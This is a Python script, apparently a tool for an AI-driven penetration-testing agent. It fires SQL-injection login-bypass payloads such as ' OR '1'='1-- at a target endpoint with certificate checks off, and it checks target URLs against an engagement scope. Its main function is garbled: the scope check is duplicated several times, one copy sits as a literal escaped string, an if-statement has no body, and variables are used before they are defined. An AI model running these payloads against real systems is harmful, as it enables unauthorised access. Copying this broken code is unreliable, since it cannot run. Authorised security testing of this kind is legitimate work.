import json
import sys
import re
import requests

def parse_json_input(json_str):
    return json.loads(json_str)

def build_sqli_payloads():
    payloads = [
        "' OR '1'='1--",
        "' OR 1=1--",
        "1' UNION SELECT NULL--",
        "' AND 1=1 --",
        "AND '1'='1",
        "' OR TRUE --"
    ]
    return payloads

def test_sqli(payloads, data):
    for payload in payloads:
        response = requests.post(url=data["target_url"] + data["endpoint"], headers=data["headers"], json={**data["body"], **{"email": f"{payload}"}}, verify=False)
        if response.status_code == 200 and ("token" in response.text.lower() or "authentication" in response.text.lower() or 
                                            re.search(r'error in your SQL syntax|sqlite3|syntax error', response.text, re.IGNORECASE)):
            return payload, f"{response.status_code} {response.reason} | {response.text[:300]}"
    return None, ""

import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from ..engagement_scope import EngagementGate
from ..gate_guarded_request import is_url_allowed

def main(scope_file=None, engagement_gate=None):
    if len(sys.argv) < 2 or (len(sys.argv) == 3 and not scope_file):
    scope_file = sys.argv[2] if len(sys.argv) == 3 else None
    from tools.engagement_scope import EngagementGate
    engagement_gate = EngagementGate(scope_file)
    if not engagement_gate.check(data['target_url'])[0]:
        print(f'{C.R}[!] Target URL is out of scope: {data["target_url"]}{C.X}')
        sys.exit(1)
    else:
        print(f'{C.G}[+] Target URL is within scope: {data["target_url"]}{C.X}')

    scope_file = sys.argv[2] if len(sys.argv) == 3 else None
    from tools.engagement_scope import EngagementGate
    engagement_gate = engagement_gate or EngagementGate(scope_file)
    if not engagement_gate.check(data['target_url'])[0]:
        print(f'{C.R}[!] Target URL is out of scope: {data["target_url"]}{C.X}')
        sys.exit(1)
    else:
        print(f'{C.G}[+] Target URL is within scope: {data["target_url"]}{C.X}')

    scope_file = sys.argv[2] if len(sys.argv) == 3 else None
    from tools.engagement_scope import EngagementGate
    engagement_gate = engagement_gate or EngagementGate(scope_file)
    if not engagement_gate.check(data['target_url'])[0]:
        print(f'{C.R}[!] Target URL is out of scope: {data["target_url"]}{C.X}')
        sys.exit(1)
    else:
        print(f'{C.G}[+] Target URL is within scope: {data["target_url"]}{C.X}')

    scope_file = sys.argv[2] if len(sys.argv) == 3 else None
    from tools.engagement_scope import EngagementGate
    engagement_gate = engagement_gate or EngagementGate(scope_file)
    if not engagement_gate.check(data['target_url'])[0]:
        print(f'{C.R}[!] Target URL is out of scope: {data["target_url"]}{C.X}')
        sys.exit(1)
    else:
        print(f'{C.G}[+] Target URL is within scope: {data["target_url"]}{C.X}')

    scope_file = sys.argv[2] if len(sys.argv) == 3 else None
    from tools.engagement_scope import EngagementGate
    engagement_gate = engagement_gate or EngagementGate(scope_file)
    if not engagement_gate.check(data['target_url'])[0]:
        print(f'{C.R}[!] Target URL is out of scope: {data["target_url"]}{C.X}')
        sys.exit(1)
\n    scope_file = sys.argv[2] if len(sys.argv) == 3 else None\n    from tools.engagement_scope import EngagementGate\n    engagement_gate = EngagementGate(scope_file)\n    if not engagement_gate.is_in_scope(target_url):\n        print(f'{{C.R}}[!] Target URL is out of scope: {{target_url}}{{C.X}}')\n        sys.exit(1)\n\n
        raise ValueError("Please provide a JSON string as the first argument.")

    json_input = sys.argv[1]
    data = parse_json_input(json_input)

    # Check if the target URL is within the engagement scope
    engagement_gate = EngagementGate(data.get('scope', {}))
    if not engagement_gate.is_in_scope(data['target_url']):
        raise ValueError(f"Target URL {data['target_url']} is not within the engagement scope.")


    # TRUSTED-CHANNEL gate (authoritative): caller 'scope' can only NARROW; the actual request URL must
    # also be allowed by SABRINA_ACTIVE_SCOPE_FILE so a model can't widen scope via a permissive 'scope'
    # argument. Fail-closed when no trusted scope is configured.
    full_url = data['target_url'] + data.get('endpoint', '')
    trusted_ok, trusted_reason = is_url_allowed(full_url)
    if not trusted_ok:
        print(json.dumps({"confirmed": False, "blocked_reason": f"trusted-scope: {trusted_reason}"}))
        return

    payloads = build_sqli_payloads()
    successful_payload, evidence = test_sqli(payloads, data)

    output = {
        "confirmed": bool(successful_payload),
        "successful_payload": successful_payload,
        "evidence": evidence
    }
    print(json.dumps(output))

if __name__ == "__main__":
    main()